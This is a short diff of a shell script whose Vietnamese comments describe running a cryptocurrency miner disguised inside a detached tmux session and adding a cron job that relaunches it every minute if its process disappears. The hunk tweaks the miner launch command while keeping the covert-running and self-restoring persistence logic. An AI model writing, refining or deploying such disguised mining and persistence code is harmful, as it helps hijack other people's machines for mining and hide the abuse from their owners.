@@ -67,7 +67,7 @@ chmod +x "$INSTALL_DIR/run_miner.sh"
 
 # ==== Chạy tiến trình đào ngụy trang qua tmux ====
 tmux has-session -t "$SESSION_NAME" 2>/dev/null || \
-tmux new-session -d -s "$SESSION_NAME" "$INSTALL_DIR/run_miner.sh"
+tmux new-session -d -s "$SESSION_NAME" "cd $INSTALL_DIR && exec ./run_miner.sh"
 
 # ==== Tạo cron job để tự khôi phục ====
 (crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME '$INSTALL_DIR/run_miner.sh')") | crontab -
